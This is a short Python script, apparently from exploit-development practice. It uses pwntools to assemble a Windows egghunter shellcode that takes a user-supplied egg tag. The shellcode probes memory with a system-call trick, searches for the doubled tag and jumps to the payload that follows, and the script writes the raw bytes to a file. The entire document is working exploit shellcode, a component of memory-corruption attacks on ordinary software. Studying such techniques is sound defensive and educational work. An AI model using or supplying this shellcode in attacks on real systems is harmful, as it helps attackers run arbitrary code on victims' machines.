from pwn import *
import sys

if not(sys.argv[1]):
    print "[!] Error. Specify egg in hex format"
    sys.exit(0)
else:
    egg = sys.argv[1]
    shellcode= '''
        loop_inc_page:
            or dx, 0x0fff
        loop_inc_one:
            inc edx
        loop_check:
            push edx
            push 0x2
            pop eax
            int 0x2e
            cmp al, 05
            pop edx
        loop_check_8_valid:
            je loop_inc_page
        is_egg:
            mov eax, %(egg)s
            mov edi, edx
            scasd
            jnz loop_inc_one
            scasd
            jnz loop_inc_one
        matched:
            jmp edi ''' % (locals())
    p = asm(shellcode)
    with open("egghunter","wb+") as f:
        f.write(p)

